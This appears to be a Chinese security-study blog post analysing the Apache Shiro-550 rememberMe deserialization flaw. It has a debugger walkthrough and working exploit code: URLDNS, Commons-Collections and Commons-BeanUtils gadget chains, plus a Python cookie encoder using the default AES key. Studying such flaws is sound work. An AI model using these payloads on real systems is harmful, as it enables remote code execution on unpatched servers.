---
title: JAVA安全:Shiro-550反序列化
---

*作者：Narcher*	*时间：2024/3/23*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

Apache Shiro是一个开源的Java安全框架，可执行身份验证、授权、密码和会话管理。Shiro-550的漏洞最早披露于2016年，影响版本为：shiro<1.2.4，特征：返回包的http头中包含Set-Cookie: rememberMe=deleteMe

emmm....直接开始学习吧



## 正文

### 1.环境搭建

<1>直接下载shiro-1.2.4

https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4

<2>打开IDEA，将shiro-shiro-root-1.2.4的samples下的web包以Maven的形式导入即可

<3>更改pom.xml文件中的jstl配置，增加1.2版本设置，如下：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710984978093.png" alt="1710984978093" style="zoom:67%;" />

<4>配置好IDEA内置的tomcat服务，启动即可，成功后效果如下：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985093595.png" alt="1710985093595" style="zoom: 33%;" />

### 2.调试

Shiro的加解密实际上是一对，从名字也很容易看出来：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711002884950.png" alt="1711002884950" style="zoom:50%;" />

#### 2.1 加密分析

直接把断点打在org.apache.shiro.mgt.AbstractRememberMeManager类的onSuccessfulLogin方法中：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985507053.png" alt="1710985507053" style="zoom:67%;" />

然后我们开始调试运行，登录root:secret账号，并勾选RememberMe选项，点击Login，转入IDEA开始分析

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710985773507.png" alt="1710985773507" style="zoom: 50%;" />

可见程序停在了我们的断点处，我们继续跟进：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986058301.png" alt="1710986058301" style="zoom:67%;" />

此时进入了rememberIdentity方法，我们继续跟进：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986269057.png" alt="1710986269057" style="zoom:67%;" />

在getIdentityToRemember方法中返回了用户名root，并给principals赋值，接着进入重写的rememberIdentity方法：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986430909.png" alt="1710986430909" style="zoom:67%;" />

到这一步就开始对用户名root进行操作了，我们继续跟进：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986500638.png" alt="1710986500638" style="zoom: 67%;" />

可见这里对root进行了序列化，并赋值给字节数组，之后在encrypt中进行加密操作，我们继续跟进：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710986670678.png" alt="1710986670678" style="zoom: 67%;" />

进入encrypt方法之后，看起来像是对序列化之后的用户名进行了加密操作，我们来看一下cipherService：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710987965249.png" alt="1710987965249" style="zoom:50%;" />

很明显，对序列化之后的用户名进行了AES加密，我们跟进来看一下AES加密的Key值：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710988133694.png" alt="1710988133694" style="zoom:67%;" />

这个encryptionCipherKey的赋值可以看一下：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989637276.png" alt="1710989637276" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989372541.png" alt="1710989372541" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989398262.png" alt="1710989398262" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710989422395.png" alt="1710989422395" style="zoom:67%;" />

可见Key实际上就是一个固定的值：`kPH+bIxk5D2deZiIxcaaaA==`的base64解码

确定了AES加密的Key之后我们继续跟进，之后便是一系列的加密过程，我们在这里直接省略，直接看加密完成后的流程：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710990026308.png" alt="1710990026308" style="zoom: 67%;" />

直接从convertPrincipalsToBytes方法return values回到rememberIdentity，然后我们继续跟进：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710990294364.png" alt="1710990294364" style="zoom: 50%;" />

之后便是对加密后的值进行base64编码，然后设置到cookie之中

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1710991426004.png" alt="1710991426004" style="zoom: 50%;" />

总结流程：

<1>用户名序列化

<2>AES加密

<3>base64加密

<4>将加密结果放到cookie的rememberMe上

#### 2.2 解密分析

注意：解密的时候请求头中注意删掉JSESSIONID，否则不会进行解密流程！！！

直接把断点打在org.apache.shiro.mgt.DefaultSecurityManager的getRememberedIdentity方法中：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711022197020.png" alt="1711022197020" style="zoom: 50%;" />

这里我们重点跟进getRememberedPrincipals方法：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711022756959.png" alt="1711022756959" style="zoom: 67%;" />

这里我们比较感兴趣的是getRememberedSerializedIdentity方法和convertBytesToPrincipals方法，我们逐个跟进一下：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023002495.png" alt="1711023002495" style="zoom:50%;" />

看起来很长，实际上就是进行两个主要的操作，一个是获取cookie中的base64信息，另一个就是进行base64解密并返回，我们再跟进convertBytesToPrincipals方法看一下：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023436152.png" alt="1711023436152" style="zoom: 67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023527657.png" alt="1711023527657" style="zoom: 50%;" />

可以看到就是一个AES解密加一个反序列化，最终返回我们的用户名root

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023604785.png" alt="1711023604785" style="zoom:50%;" />

可见以root的身份登录：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711023811540.png" alt="1711023811540" style="zoom: 50%;" />

总结流程：

<1>读取cookie中的rememberMe的值

<2>对值进行base64解密

<3>对解密结果进行AES解密+反序列化得到用户名

### 3.漏洞利用

解密流程中对cookie中的rememberMe的值最终进行了反序列化操作，那么我们只要传入前边学过的反序列化触发的链子便可以进行命令执行

#### 3.1 URLDNS链

由于URLDNS链基本上都是用的Java内置类实现的，所以应用范围较广，但也就只能用来发起DNS请求，我们来试一下：

这里我直接把之前学的URLDNS链原封不动拿过来了：

```java
HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
URL url = new URL("http://ob328eym9gl464dbs50lp5unwe24qt.burpcollaborator.net");
Class c = url.getClass();
Field hashcode = c.getDeclaredField("hashCode");
hashcode.setAccessible(true);
hashcode.set(url,1);
hashMap.put(url,1);
hashcode.set(url,-1);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\URLDNS.txt"));
oos.writeObject(hashMap);
```

之后就是对序列化后的数据进行AES加密和base64加密：

```python
import sys
import uuid
import base64
from Crypto.Cipher import AES

def encode_rememberme():
    f = open('URLDNS.txt','rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme()    
    print("rememberMe={0}".format(payload.decode()))
```

然后打就完了：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711105808591.png" alt="1711105808591" style="zoom:50%;" />

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711099895450.png" alt="1711099895450" style="zoom: 50%;" />

成功

#### 3.2 CC链

如果是按照上述环境搭建的流程来的话，因为shiro本身是不带CC依赖的，所以到这一步需要加一个CC依赖：

```xml
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

之后呢，如果我们正常拿CC链来打的话是打不通的（tomcat的类加载器里边不支持数组类的加载），当然，如果你的CC依赖是CC4的话，是可以直接拿CC2来打的，我们这里用的是CC3的依赖，CC2打不了，就需要构造自己的链子来把Transformer数组给去掉，我在这里学的是白日梦组长的链子，思路相当于之前学过的CC3、CC6、CC2的集合，忘记了的话可以去看一下前面的知识：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
HashMap<Object,Object> map = new HashMap<>();
Map<Object,Object> innerMap = LazyMap.decorate(map, new ConstantTransformer(1));
TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, templates);
HashMap<Object, Object> hashMap = new HashMap<>();
hashMap.put(tiedMapEntry, "bbb");
innerMap.remove(templates);
Class c = LazyMap.class;
Field factoryField = c.getDeclaredField("factory");
factoryField.setAccessible(true);
factoryField.set(innerMap,invokerTransformer);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\shiro_CC.txt"));
oos.writeObject(hashMap);
```

```python
import sys
import uuid
import base64
from Crypto.Cipher import AES

def encode_rememberme():
    f = open('shiro_CC.txt','rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme()    
    print("rememberMe={0}".format(payload.decode()))
```

是能够打的通的：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711109384042.png" alt="1711109384042" style="zoom: 50%;" />

#### 3.3 CB链

上边也说了，shiro原生是不带CC依赖的，所以打原生就要用到CB了，如果是按上述流程搭建的环境，那么shiro自带的CB是1.8.3版本的，我们接下来看看链子应该怎么构造：

首先，CB链最后的命令执行流程还是和CC3是一样的，因为利用的是Java的反射机制和动态类加载的特性，我们先把前边的拿过来：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
```

按原先CC3的步骤，我们是直接利用TrAXfilter类进行templates的newTransformer方法的触发，但这里我们CB依赖里是没有这个类的，因此我们就要从TemplatesImpl类中找一下能命令执行的点，实际上这里用的就是CB中的PropertyUtils.getProperty方法，它能够获取类的实例化对象中的JavaBean格式的方法，而TemplatesImpl类中恰好有符合JavaBean格式，且能够利用的方法：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711199986851.png" alt="1711199986851" style="zoom: 67%;" />

而PropertyUtils类是没有继承序列化接口的，我们需要在CB依赖中找到一个调用PropertyUtils.getProperty方法的类且继承了序列化接口，这里我们使用BeanComparator类，其中有着compare方法：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711200210269.png" alt="1711200210269" style="zoom: 67%;" />

这部分的链子应该这样写：

```java
BeanComparator beanComparator = new BeanComparator("outputProperties", new AttrCompare());
```

至于为什么要传AttrCompare类的实例，可以看一下BeanComparator构造器的源码：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711201185415.png" alt="1711201185415" style="zoom:67%;" />

其中的ComparableComparator类来自于CC依赖，在shiro原生中是没有的，所以我们就用了一个即在CB依赖中有，又继承了序列化接口的类。

接下来寻找调用compare方法的类，是不是很熟悉了？

没错，在之前的CC4链的学习中，我们就用了compare方法来触发ChainedTransformer的transform方法，那么我们去再看一看那个compare方法：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711200539928.png" alt="1711200539928" style="zoom:67%;" />

可见其不仅调用了transform方法，还调用了compare方法，我们只需要把decorated传成我们构造好的BeanComparator类的实例就好了，只需要把CC4中传入priorityQueue的transformingComparator改成beanComparator就好了，接下来的流程就和CC4后边一样了，我们直接拿过来：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
BeanComparator beanComparator = new BeanComparator("outputProperties", new AttrCompare());
TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
priorityQueue.add(templates);
priorityQueue.add(2);
Class<PriorityQueue> c = PriorityQueue.class;
Field comparatorField = c.getDeclaredField("comparator");
comparatorField.setAccessible(true);
comparatorField.set(priorityQueue,beanComparator);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\shiro_CB.txt"));
oos.writeObject(priorityQueue);
```

最后打一下看看：

<img src="JAVA%E5%AE%89%E5%85%A8shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1711201791201.png" alt="1711201791201" style="zoom:67%;" />

成功执行
